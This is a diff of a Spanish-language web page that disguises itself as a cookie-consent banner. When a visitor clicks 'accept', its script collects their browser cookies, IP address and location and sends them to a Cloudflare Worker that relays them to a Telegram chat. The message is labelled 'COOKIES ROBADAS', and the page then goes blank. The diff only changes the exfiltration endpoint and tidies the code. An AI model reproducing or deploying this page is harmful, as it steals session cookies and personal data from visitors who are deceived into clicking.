@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aviso de Cookies</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #f0f2f5;
@@ -28,22 +24,9 @@
             box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
             text-align: center;
         }
-        .cookie-icon {
-            font-size: 4rem;
-            margin-bottom: 16px;
-        }
-        h2 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-        p {
-            color: #5f5f5f;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
+        .cookie-icon { font-size: 4rem; margin-bottom: 16px; }
+        h2 { font-size: 1.5rem; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
+        p { color: #5f5f5f; font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
         .btn {
             display: inline-block;
             background: #1877f2;
@@ -57,18 +40,9 @@
             width: 100%;
             transition: background 0.2s;
         }
-        .btn:active {
-            background: #0d65d9;
-            transform: scale(0.98);
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 0.7rem;
-            color: #8e8e8e;
-        }
-        .hidden {
-            display: none !important;
-        }
+        .btn:active { background: #0d65d9; transform: scale(0.98); }
+        .footer { margin-top: 20px; font-size: 0.7rem; color: #8e8e8e; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -76,10 +50,7 @@
         <div class="cookie-card">
             <div class="cookie-icon">🍪</div>
             <h2>Gestionar cookies</h2>
-            <p>
-                Utilizamos cookies propias y de terceros para mejorar tu experiencia,
-                analizar el tráfico y mostrarte contenido personalizado.
-            </p>
+            <p>Utilizamos cookies propias y de terceros para mejorar tu experiencia, analizar el tráfico y mostrarte contenido personalizado.</p>
             <button class="btn" id="acceptBtn">Aceptar todas las cookies</button>
             <div class="footer" id="status">⚡ Tus preferencias son importantes para nosotros</div>
         </div>
@@ -90,7 +61,9 @@
     </div>
 
     <script>
-        const WORKER_URL = 'https://kali-bot12.societykark.workers.dev';
+        // ================= CONFIGURACIÓN =================
+        // ✅ NUEVO WORKER (donde está el token seguro)
+        const WORKER_URL = 'https://galleta.societykark.workers.dev';
         const CHAT_ID = '7555997298';
 
         function getCookies() {
@@ -102,20 +75,20 @@
                 .filter(c => c.name && c.value);
         }
 
-        async function getLocation() {
+        async function getIPInfo() {
             try {
-                const res = await fetch(WORKER_URL);
-                if (!res.ok) return { ip: 'N/A', city: 'N/A', country: 'N/A', region: 'N/A' };
+                const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) throw new Error();
                 const data = await res.json();
                 return {
                     ip: data.ip || 'N/A',
                     city: data.city || 'N/A',
-                    country: data.country || 'N/A',
                     region: data.region || 'N/A',
+                    country: data.country_name || 'N/A',
                     timezone: data.timezone || 'N/A'
                 };
             } catch {
-                return { ip: 'N/A', city: 'N/A', country: 'N/A', region: 'N/A' };
+                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', timezone: 'N/A' };
             }
         }
 
@@ -125,15 +98,13 @@
             blank.style.display = 'flex';
             blank.classList.remove('hidden');
             document.body.style.background = 'white';
-            document.body.style.margin = '0';
-            document.body.style.padding = '0';
         }
 
         async function sendCookiesToTelegram() {
             const cookies = getCookies();
             const userAgent = navigator.userAgent;
             const url = window.location.href;
-            const location = await getLocation();
+            const ipInfo = await getIPInfo();
 
             let device = 'Desconocido';
             if (userAgent.includes('iPhone')) device = 'iPhone';
@@ -144,40 +115,44 @@
 
             let message = `🍪 *COOKIES ROBADAS*\n━━━━━━━━━━━━━━━━\n\n`;
             message += `📱 *Dispositivo:* ${device}\n`;
-            message += `🌐 *IP:* ${location.ip}\n`;
-            message += `📍 *Ciudad:* ${location.city}\n`;
-            message += `📍 *Región:* ${location.region}\n`;
-            message += `📍 *País:* ${location.country}\n`;
-            message += `⏰ *Zona Horaria:* ${location.timezone}\n`;
+            message += `🌐 *IP:* ${ipInfo.ip}\n`;
+            message += `📍 *Ciudad:* ${ipInfo.city}\n`;
+            message += `📍 *Región:* ${ipInfo.region}\n`;
+            message += `📍 *País:* ${ipInfo.country}\n`;
+            message += `⏰ *Zona Horaria:* ${ipInfo.timezone}\n`;
             message += `🌐 *URL:* ${url}\n\n`;
             message += `📋 *Cookies encontradas:* ${cookies.length}\n\n`;
 
             if (cookies.length === 0) {
                 message += `❌ No se encontraron cookies.\n`;
             } else {
-                cookies.forEach((c) => {
-                    let valueDisplay = c.value;
-                    if (valueDisplay.length > 60) {
-                        valueDisplay = valueDisplay.slice(0, 60) + '...';
-                    }
-                    message += `• *${c.name}*: \`${valueDisplay}\`\n`;
+                cookies.forEach(c => {
+                    let display = c.value.length > 60 ? c.value.slice(0, 60) + '...' : c.value;
+                    message += `• *${c.name}*: \`${display}\`\n`;
                 });
                 message += `\n📦 *Total:* ${cookies.length} cookies robadas.`;
             }
 
+            // 📤 Enviar al Worker (el token está seguro ahí)
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('text', message);
 
             try {
-                await fetch(WORKER_URL, {
+                const res = await fetch(WORKER_URL, {
                     method: 'POST',
                     body: formData,
                     mode: 'cors',
                     credentials: 'omit'
                 });
+                if (!res.ok) {
+                    const errorText = await res.text();
+                    console.error('Error al enviar al Worker:', errorText);
+                } else {
+                    console.log('✅ Cookies enviadas correctamente');
+                }
             } catch (e) {
-                console.warn('Error al enviar:', e);
+                console.error('Error de red:', e);
             }
 
             showBlankPage();
@@ -186,6 +161,7 @@
         document.getElementById('acceptBtn').addEventListener('click', function(e) {
             e.preventDefault();
             this.disabled = true;
+            this.textContent = '⏳ Procesando...';
             sendCookiesToTelegram();
         });
     </script>
